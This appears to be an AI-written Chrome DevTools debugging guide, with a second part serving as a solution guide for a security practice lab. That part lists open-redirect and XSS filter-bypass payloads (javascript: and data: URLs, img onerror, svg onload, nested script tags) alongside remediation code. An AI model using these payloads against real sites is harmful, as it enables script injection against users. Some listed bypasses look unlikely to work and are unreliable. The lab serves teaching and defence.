# ChromeDebug

# Chrome DevTools Debugging Guide

## Initial Setup
1. Open the page in Chrome
2. Access DevTools:
   - Press F12 or right-click > Inspect
   - Navigate to Sources panel
   - Locate the inline script in the HTML file

## Feature-by-Feature Debugging Guide

### 1. Counter Debugging
#### Breakpoints:
```javascript
function incrementCounter() {
```
- At this breakpoint, check:
  ```javascript
  console.log('Current count:', count);
  ```
- Press F10 to step through each line
- Watch `count` variable changes

#### Additional Breakpoint:
```javascript
if (count % 10 === 0)
```
- At this point verify:
  ```javascript
  console.log('Is multiple of 10:', count % 10 === 0);
  ```

### 2. Color Box Debugging
#### Initial Breakpoint:
```javascript
function changeColor() {
```
- Check these values:
  ```javascript
  console.log('Current color index:', currentColorIndex);
  console.log('Available colors:', colors);
  ```

#### Second Breakpoint:
```javascript
box.style.backgroundColor = colors[currentColorIndex];
```
- Verify color application:
  ```javascript
  console.log('New color being applied:', colors[currentColorIndex]);
  ```

### 3. Todo List Debugging
#### First Breakpoint:
```javascript
function addTodo() {
```
- Examine current state:
  ```javascript
  console.log('Current todos:', todos);
  console.log('Input value:', input.value);
  ```

#### Second Breakpoint:
```javascript
todos.push({
```
- Check new todo creation:
  ```javascript
  console.log('New todo object:', {
      id: Date.now(),
      text: input.value,
      completed: false
  });
  ```

#### Toggle Breakpoint:
```javascript
function toggleTodo(id) {
```
- Verify todo being modified:
  ```javascript
  console.log('Todo being toggled:', todos.find(t => t.id === id));
  ```

### 4. User Data Loading Debugging
#### Initial Breakpoint:
```javascript
async function loadUsers() {
```
- Log start of operation:
  ```javascript
  console.log('Starting user load');
  ```

#### Fetch Breakpoint:
```javascript
const response = await fetch
```
- After response arrives, examine:
  ```javascript
  console.log('Response:', response);
  console.log('Users data:', users);
  ```

### 5. Timer Debugging
#### Start Breakpoint:
```javascript
function startTimer() {
```
- Check initial state:
  ```javascript
  console.log('Initial timeLeft:', timeLeft);
  ```

#### Interval Breakpoint:
```javascript
timeLeft--;
```
- Monitor each tick:
  ```javascript
  console.log('Time remaining:', timeLeft);
  ```

### 6. Form Validation Debugging
#### Submit Breakpoint:
```javascript
function handleSubmit(event) {
```
- Check form values:
  ```javascript
  console.log('Username:', username);
  console.log('Email:', email);
  ```

#### Validation Breakpoints:
- Username validation:
  ```javascript
  console.log('Username length:', username.length);
  console.log('Is username valid:', username.length >= 3);
  ```
- Email validation:
  ```javascript
  console.log('Email contains @:', email.includes('@'));
  ```

## Interactive Debugging Workflow

### 1. Counter Testing
1. Click counter button to initiate
2. Press F8 to resume after each breakpoint
3. Monitor counter increments in console
4. Try modifying count:
   ```javascript
   count = 9
   ```
5. Resume to observe multiple of 10 trigger

### 2. Color Testing
1. Click "Change Color" button
2. Examine currentColorIndex at breakpoint
3. Modify color via console:
   ```javascript
   colors[currentColorIndex] = '#FF0000'
   ```
4. Resume to observe color change

### 3. Todo Testing
1. Add todo item
2. Examine todo array at breakpoint
3. Add todo via console:
   ```javascript
   todos.push({
     id: Date.now(),
     text: "Console added",
     completed: false
   })
   updateTodoList()
   ```

### 4. User Data Testing
1. Observe async operation flow
2. Examine response data structure
3. Modify users before render

### 5. Timer Testing
1. Monitor timeLeft changes
2. Modify timeLeft via console
3. Observe interval behavior

### 6. Form Testing
1. Submit invalid data
2. Monitor validation checks
3. Try validation bypass via console

## Essential Debugging Shortcuts
- **F8**: Resume execution to next breakpoint
- **F10**: Step over function calls
- **F11**: Step into function calls
- **Shift + F11**: Step out of current function

## Additional Tips
1. Use the Scope panel to watch variables
2. Modify values at breakpoints using console
3. Create conditional breakpoints:
   - Right-click line number
   - Select "Add conditional breakpoint"
   - Enter condition (e.g., `count === 5`)
4. Use console to modify application state
5. Watch network requests in Network tab


# Security Practice Lab - Debugging Solution Guide

## Initial Setup
1. Open Chrome DevTools (F12)
2. Go to Sources panel
3. Find the inline script
4. Clear browser cache and cookies for clean testing

## Part 1: URL Redirect Vulnerability

### 1.1 Analyzing the Redirect Function
Set breakpoints at:
```javascript
function handleRedirect(event) {
function isValidUrl(url) {
window.location.href = url;
```

### 1.2 Testing Valid URL Flow
1. Enter: `https://google.com`
2. At first breakpoint:
   ```javascript
   console.log('Event object:', event);
   console.log('Form data:', new FormData(event.target));
   ```
3. Step into `isValidUrl` (F11)
4. Check validation:
   ```javascript
   console.log('URL being validated:', url);
   console.log('Starts with http://', url.startsWith('http://'));
   console.log('Starts with https://', url.startsWith('https://'));
   ```

### 1.3 Finding Validation Bypass
1. Set conditional breakpoint at `isValidUrl`:
   - Right-click line number
   - Add condition: `url.includes('javascript:')`
2. Try payload: `javascript:alert(1)`
   - Observe validation failure
3. Try encoded payload:
   ```javascript
   // In console at breakpoint
   document.getElementById('redirectUrl').value = 'https://google.com' + encodeURIComponent('javascript:alert(1)');
   ```
4. Final payload test:
   ```javascript
   https://google.com%2Fjavascript:alert(1)
   ```

### 1.4 Debugging the Bypass
1. At `window.location.href` breakpoint:
   ```javascript
   console.log('Final URL:', url);
   console.log('Decoded URL:', decodeURIComponent(url));
   ```
2. Modify URL at breakpoint:
   ```javascript
   // Try changing URL directly
   url = 'javascript:alert("Modified via debugger")';
   ```

## Part 2: XSS Vulnerability

### 2.1 Analyzing Message Sanitization
Set breakpoints at:
```javascript
function postMessage(event) {
function sanitizeMessage(message) {
messageDiv.innerHTML =
```

### 2.2 Testing Basic Sanitization
1. Enter message: `<script>alert(1)</script>`
2. At sanitization breakpoint:
   ```javascript
   console.log('Original message:', message);
   console.log('After replace:', message.replace(/script/gi, ''));
   ```
3. Watch Scope panel for:
   - message variable
   - sanitizedMessage result

### 2.3 Finding Sanitization Bypass
1. At `sanitizeMessage` breakpoint:
   ```javascript
   // Test different payloads
   console.log('Test payloads:');
   const payloads = [
     '<scrscriptipt>alert(1)</scrscriptipt>',
     '<img src=x onerror=alert(1)>',
     '<svg onload=alert(1)>',
   ];
   payloads.forEach(p => console.log(
     p, '=>', sanitizeMessage(p)
   ));
   ```

2. Modify message at breakpoint:
   ```javascript
   // Try bypassing via debugger
   message = '<img src=x onerror=alert("XSS via debugger")>';
   ```

### 2.4 Testing DOM Insertion
1. At `innerHTML` breakpoint:
   ```javascript
   console.log('HTML being inserted:', messageDiv.innerHTML);
   ```
2. Watch DOM changes:
   - Go to Elements panel
   - Right-click element
   - Break on subtree modifications

## Part 3: Advanced Debugging Techniques

### 3.1 Network Analysis
1. Open Network tab
2. Filter by:
   - XHR/Fetch requests
   - Script requests

### 3.2 Console Tricks
```javascript
// Monitor all URL changes
monitorEvents(window, 'hashchange');
monitorEvents(window, 'popstate');

// Watch DOM changes
const observer = new MutationObserver((mutations) => {
    console.log('DOM changed:', mutations);
});
observer.observe(document.body, { 
    childList: true, 
    subtree: true 
});
```

### 3.3 Breakpoint Types to Use
1. Line breakpoints (click line number)
2. Conditional breakpoints (right-click line number)
3. DOM breakpoints (Elements panel)
4. XHR breakpoints (Sources panel)
5. Event listener breakpoints (Sources panel)

## Part 4: Successful Payloads

### 4.1 URL Redirect Bypasses
```javascript
// Try these payloads
https://google.com/javascript:alert(1)
javascript://%0Aalert(1)
data:text/html,<script>alert(1)</script>
```

### 4.2 XSS Bypasses
```javascript
// Try these payloads
<scrscriptipt>alert(1)</scrscriptipt>
<img src="x" onerror="alert(1)">
<svg><script>alert(1)</script></svg>
<svg onload="alert(1)">
```

## Part 5: Protection Verification

### 5.1 Testing URL Validation
```javascript
// At isValidUrl breakpoint
const testUrls = [
    'https://google.com',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'https://google.com/javascript:alert(1)'
];
testUrls.forEach(url => {
    console.log(`Testing ${url}:`, isValidUrl(url));
});
```

### 5.2 Testing Message Sanitization
```javascript
// At sanitizeMessage breakpoint
const testMessages = [
    '<script>alert(1)</script>',
    '<scrscriptipt>alert(1)</scrscriptipt>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>'
];
testMessages.forEach(msg => {
    console.log(`Testing ${msg}:`, sanitizeMessage(msg));
});
```

## Remediation Testing

### Test Improved URL Validation
```javascript
function betterUrlValidation(url) {
    try {
        const urlObj = new URL(url);
        return urlObj.protocol === 'https:';
    } catch {
        return false;
    }
}
```

### Test Improved Message Sanitization
```javascript
function betterSanitization(message) {
    const div = document.createElement('div');
    div.textContent = message;
    return div.textContent;
}
```

## Notes
- Always clear browser cache between tests
- Use private/incognito window for clean testing
- Document all successful bypasses
- Note points where debugger helped identify vulnerabilities

Would you like me to explain any specific part of these instructions in more detail?